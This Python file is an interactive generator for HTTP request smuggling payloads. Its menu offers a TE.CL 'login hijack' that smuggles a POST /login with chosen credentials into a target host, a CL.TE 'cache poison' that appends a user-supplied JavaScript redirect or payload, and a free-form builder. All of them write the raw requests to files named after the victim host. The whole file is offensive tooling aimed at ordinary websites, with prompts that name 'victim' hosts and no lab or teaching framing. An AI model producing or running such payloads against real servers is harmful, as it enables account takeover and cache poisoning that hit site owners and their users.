import os
from datetime import datetime

def generate_payload():
    print("\n[+] Payload Generator")
    print("[1] TE.CL Login Hijack Payload")
    print("[2] CL.TE Cache Poison Payload")
    print("[3] Custom Payload Builder")
    print("[0] Back\n")

    choice = input("Choose a payload type: ").strip()

    if choice == "1":
        _gen_tecl_login()
    elif choice == "2":
        _gen_clte_cache()
    elif choice == "3":
        _custom_payload()
    else:
        print("[!] Returning to main menu.")

def _gen_tecl_login():
    host = input("Target host (e.g. login.victim.com): ").strip()
    username = input("Username to inject: ").strip()
    password = input("Password to inject: ").strip()

    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: 4\r\n"
        f"\r\n"
        f"0\r\n\r\n"
        f"POST /login HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(f'username={username}&password={password}')}\r\n"
        f"\r\n"
        f"username={username}&password={password}"
    )

    save_path = f"payloads/tecl_login_{host.replace('.', '_')}.txt"
    os.makedirs("payloads", exist_ok=True)
    with open(save_path, "w") as f:
        f.write(payload)
    print(f"[+] Saved to {save_path}")

def _gen_clte_cache():
    host = input("Target host (e.g. victim.com): ").strip()
    poison = input("JS redirect or payload to poison cache with: ").strip()

    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{poison}"
    )

    save_path = f"payloads/clte_cache_{host.replace('.', '_')}.txt"
    os.makedirs("payloads", exist_ok=True)
    with open(save_path, "w") as f:
        f.write(payload)
    print(f"[+] Saved to {save_path}")

def _custom_payload():
    host = input("Target host: ").strip()
    print("[*] Type your full custom payload below. End with a single line containing ONLY 'EOF'.")
    print("Example start: POST / HTTP/1.1\\r\\nHost: example.com...")
    lines = []
    while True:
        line = input()
        if line.strip() == "EOF":
            break
        lines.append(line)

    final_payload = "\r\n".join(lines)
    filename = f"payloads/custom_{host.replace('.', '_')}_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt"
    os.makedirs("payloads", exist_ok=True)
    with open(filename, "w") as f:
        f.write(final_payload)
    print(f"[+] Saved to {filename}")
